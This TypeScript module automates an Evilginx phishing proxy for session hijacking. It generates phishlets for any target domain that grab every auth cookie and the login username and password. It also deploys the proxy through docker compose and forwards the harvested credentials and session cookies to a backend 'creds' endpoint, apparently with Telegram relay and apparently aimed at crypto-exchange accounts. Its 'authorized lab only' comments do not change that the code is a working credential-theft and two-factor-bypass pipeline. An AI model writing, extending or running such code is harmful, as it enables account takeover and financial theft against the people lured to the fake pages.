/**
 * Evilginx2 / Evilpunch — session hijack mode (authorized red-team).
 * CLONE_MODE=session_hijack or SESSION_HIJACK_ENABLED=true
 */
import { existsSync } from 'node:fs'
import { mkdir, readFile, writeFile } from 'node:fs/promises'
import path from 'node:path'

import { envFlag, envString, readBackendUrl } from './env.js'
import type { RunCommandFn } from '../clone-tunnel-fallback-chain.js'
import {
  probeLocalMirrorHealth,
  startStaticServeFallback,
} from '../clone-tunnel-resilience.js'

export type SessionHijackDeployResult = {
  ok: boolean
  stackMode: 'docker' | 'static'
  detail?: string
}

export function isSessionHijackMode(): boolean {
  return envString('CLONE_MODE', '').toLowerCase() === 'session_hijack'
}

export function isSessionHijackEnabled(): boolean {
  return isSessionHijackMode() || envFlag('SESSION_HIJACK_ENABLED', false)
}

export function readEvilginxPhishletsDir(outDir: string): string {
  return envString('EVILGINX_PHISHLETS_DIR', path.join(outDir, 'phishlets'))
}

export function readEvilginxDataDir(outDir: string): string {
  return envString('EVILGINX_DATA_DIR', path.join(outDir, 'evilginx-data'))
}

export function readEvilginxDomain(): string {
  return envString('EVILGINX_DOMAIN', envString('EVILGINX_BASE_DOMAIN', 'localhost'))
}

function escapeYaml(value: string): string {
  return value.replace(/"/g, '\\"')
}

/** Generate a minimal phishlet YAML for the target apex domain. */
export function buildPhishletYaml(targetUrl: string, lurePath = '/login'): string {
  const url = new URL(targetUrl)
  const host = url.hostname.replace(/^www\./, '')
  const sub = host.split('.')[0] ?? 'app'
  return `# Auto-generated phishlet — authorized lab only
name: legion_${sub.replace(/[^a-z0-9]/gi, '_')}
author: legion-engine
min_ver: '3.0.0'
proxy_hosts:
  - phish_sub: '${sub}'
    orig_sub: '${sub}'
    domain: '${host.replace(/^[^.]+\./, '')}'
    session: true
    is_landing: true
sub_filters:
  - triggers_on: '${sub}.${host.replace(/^[^.]+\./, '')}'
    orig_sub: '${sub}'
    domain: '${host.replace(/^[^.]+\./, '')}'
    search: 'https://{hostname}'
    replace: 'https://{hostname}'
    mimes: ['text/html', 'application/json', 'application/javascript']
auth_tokens:
  - domain: '.${host}'
    keys: ['.*']
credentials:
  username:
    key: '(login|email|user|username)'
    search: '(.*)'
    type: 'post'
  password:
    key: '(pass|password|pwd)'
    search: '(.*)'
    type: 'post'
login:
  domain: '${sub}.${host.replace(/^[^.]+\./, '')}'
  path: '${lurePath}'
landing_path:
  - '${lurePath}'
`
}

export type CapturedSessionPayload = {
  username?: string
  password?: string
  session_cookies?: string
  exchange?: string
  page_url?: string
}

/** POST captured session to Legion /api/v1/creds (+ Telegram via backend). */
export async function forwardCapturedSessionToBackend(
  payload: CapturedSessionPayload,
  backendUrl: string,
): Promise<{ ok: boolean; detail?: string }> {
  const exchange = payload.exchange ?? 'session_hijack'
  const username = payload.username ?? 'unknown'
  const password = payload.password ?? ''

  const headers: Record<string, string> = { 'Content-Type': 'application/json' }
  const apiKey = envString('CEX_CREDS_API_KEY')
  if (apiKey) headers['X-Cex-Creds-Key'] = apiKey

  try {
    const res = await fetch(`${backendUrl.replace(/\/$/, '')}/api/v1/creds`, {
      method: 'POST',
      headers,
      body: JSON.stringify({
        exchange,
        username,
        password,
        session_cookies: payload.session_cookies ?? null,
        page_url: payload.page_url ?? null,
      }),
      signal: AbortSignal.timeout(15_000),
    })
    if (!res.ok) {
      const text = await res.text().catch(() => '')
      return { ok: false, detail: `creds API ${res.status}: ${text.slice(0, 200)}` }
    }
    return { ok: true }
  } catch (e) {
    return { ok: false, detail: e instanceof Error ? e.message : String(e) }
  }
}

/** Parse Evilginx session JSON export (sessions.json or data file). */
export async function parseEvilginxSessionFile(
  filePath: string,
): Promise<CapturedSessionPayload[]> {
  if (!existsSync(filePath)) return []
  try {
    const raw = await readFile(filePath, 'utf8')
    const parsed = JSON.parse(raw) as unknown
    const out: CapturedSessionPayload[] = []

    const pushRow = (row: Record<string, unknown>) => {
      out.push({
        username: typeof row.username === 'string' ? row.username : undefined,
        password: typeof row.password === 'string' ? row.password : undefined,
        session_cookies:
          typeof row.tokens === 'string'
            ? row.tokens
            : typeof row.cookies === 'string'
              ? row.cookies
              : JSON.stringify(row.tokens ?? row.cookies ?? ''),
        exchange: typeof row.phishlet === 'string' ? row.phishlet : 'evilginx',
        page_url: typeof row.lure_url === 'string' ? row.lure_url : undefined,
      })
    }

    if (Array.isArray(parsed)) {
      for (const row of parsed) {
        if (row && typeof row === 'object') pushRow(row as Record<string, unknown>)
      }
    } else if (parsed && typeof parsed === 'object') {
      for (const val of Object.values(parsed as Record<string, unknown>)) {
        if (val && typeof val === 'object') pushRow(val as Record<string, unknown>)
      }
    }
    return out
  } catch {
    return []
  }
}

/** Poll Evilginx data dir and forward new sessions to backend. */
export async function pollAndForwardEvilginxSessions(opts: {
  outDir: string
  backendUrl: string
  seenIds?: Set<string>
}): Promise<number> {
  const dataDir = readEvilginxDataDir(opts.outDir)
  const sessionsPath = path.join(dataDir, 'sessions.json')
  const rows = await parseEvilginxSessionFile(sessionsPath)
  const seen = opts.seenIds ?? new Set<string>()
  let forwarded = 0

  for (const row of rows) {
    const id = `${row.username ?? ''}:${row.session_cookies?.slice(0, 64) ?? ''}`
    if (seen.has(id)) continue
    const result = await forwardCapturedSessionToBackend(row, opts.backendUrl)
    if (result.ok) {
      seen.add(id)
      forwarded++
    }
  }
  return forwarded
}

export type SessionHijackDeployOpts = {
  outDir: string
  targetUrl: string
  port: number
  backendUrl: string
  runCommand: RunCommandFn
}

/** Write phishlet + docker-compose for Evilginx2 and start stack. */
export async function deploySessionHijackMirror(
  opts: SessionHijackDeployOpts,
): Promise<SessionHijackDeployResult> {
  if (!isSessionHijackEnabled()) {
    return { ok: false, detail: 'SESSION_HIJACK_ENABLED is false' }
  }

  await mkdir(opts.outDir, { recursive: true })
  const dataDir = readEvilginxDataDir(opts.outDir)
  const phishletsDir = readEvilginxPhishletsDir(opts.outDir)
  await mkdir(dataDir, { recursive: true })
  await mkdir(phishletsDir, { recursive: true })

  const phishletName = `legion_${new URL(opts.targetUrl).hostname.replace(/[^a-z0-9]/gi, '_')}`
  const phishletPath = path.join(phishletsDir, `${phishletName}.yaml`)
  await writeFile(phishletPath, buildPhishletYaml(opts.targetUrl), 'utf8')

  const image = envString('EVILGINX_DOCKER_IMAGE', 'ghcr.io/0xtidalbore/evilginx3:latest')
  const lurePort = envString('EVILGINX_HTTPS_PORT', '8443')
  const domain = readEvilginxDomain()

  const compose = `# Evilginx3 session hijack — authorized lab only
services:
  evilginx:
    image: ${image}
    cap_add:
      - NET_BIND_SERVICE
    ports:
      - "${opts.port}:443"
      - "${lurePort}:8443"
    volumes:
      - ./evilginx-data:/root/.evilginx
      - ./phishlets:/app/phishlets:ro
    environment:
      EVILGINX_DOMAIN: ${escapeYaml(domain)}
    restart: unless-stopped
`
  await writeFile(path.join(opts.outDir, 'docker-compose.yml'), compose, 'utf8')
  await writeFile(
    path.join(opts.outDir, 'session-hijack-config.json'),
    `${JSON.stringify(
      {
        mode: 'session_hijack',
        target_url: opts.targetUrl,
        phishlet: phishletName,
        backend_creds_endpoint: `${opts.backendUrl}/api/v1/creds`,
        data_dir: dataDir,
      },
      null,
      2,
    )}\n`,
    'utf8',
  )

  try {
    await opts.runCommand('docker', ['compose', 'up', '-d'], {
      cwd: opts.outDir,
      timeoutMs: 120_000,
    })
    const health = await probeLocalMirrorHealth(opts.port)
    if (health.ok) return { ok: true, stackMode: 'docker' }
  } catch (e) {
    console.error(
      `[clone-tunnel] Evilginx docker failed: ${e instanceof Error ? e.message : String(e)}`,
    )
  }

  // Fallback: static lure page + cred capture (no 2FA bypass without evilginx running)
  await writeFile(
    path.join(opts.outDir, 'index.html'),
    `<!DOCTYPE html><html><head><meta charset="utf-8"><title>Session capture</title></head><body><p>Evilginx stack unavailable — configure EVILGINX_DOCKER_IMAGE and phishlet domain.</p></body></html>`,
    'utf8',
  )
  await startStaticServeFallback(opts.outDir, opts.port)
  const staticHealth = await probeLocalMirrorHealth(opts.port)
  return staticHealth.ok
    ? { ok: true, stackMode: 'static', detail: 'Evilginx docker failed — static placeholder' }
    : { ok: false, detail: 'Session hijack deploy failed' }
}

export async function stopEvilginxStack(
  outDir: string,
  runCommand: RunCommandFn,
): Promise<void> {
  try {
    await runCommand('docker', ['compose', 'down'], { cwd: outDir, timeoutMs: 30_000 })
  } catch {
    /* ignore */
  }
}
